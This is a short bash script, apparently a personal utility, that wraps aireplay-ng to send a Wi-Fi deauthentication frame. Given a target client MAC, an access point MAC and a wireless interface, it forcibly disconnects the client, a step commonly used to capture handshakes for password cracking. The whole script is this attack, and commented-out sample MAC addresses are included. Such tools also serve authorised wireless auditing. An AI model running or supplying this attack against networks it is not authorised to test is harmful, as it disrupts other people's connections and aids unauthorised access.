#!/bin/bash
# Lerie Taylor 2023
# scarylerie@gmail.com

#client_mac=20:1e:88:b9:c4:54
#ap_mac=02:fe:5d:b0:81:3e
#my_iface=wlan0

if [ $# -ne 3 ]; then
	echo "$0 [client mac] [ap mac] [wlan iface]"
	exit 1
fi

client_mac=$1
ap_mac=$2
my_iface=$3

aireplay-ng -0 1 -a $ap_mac -c $client_mac $my_iface
